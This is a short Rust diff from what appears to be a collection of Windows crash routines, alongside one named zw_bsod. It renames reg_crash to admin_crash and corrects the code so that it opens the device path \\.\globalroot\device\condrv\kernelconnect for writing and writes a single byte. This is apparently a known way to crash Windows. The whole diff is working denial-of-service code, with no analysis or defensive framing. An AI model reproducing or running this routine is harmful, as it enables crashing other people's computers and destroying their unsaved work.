@@ -98,15 +98,21 @@ pub fn zw_bsod() {
 // }
 
 
-pub fn reg_crash() {
+
+
+pub fn admin_crash() {
+
+
     let path = r"\\.\globalroot\device\condrv\kernelconnect";
     let mut file = OpenOptions::new()
+        .write(true)
         .append(true)
-        .open(path);
+        .open(path).unwrap();
 
-    file.unwrap().write_all(b" ").unwrap();
+    file.write_all(b" ").unwrap();
+
+
 }
-
 
 
 
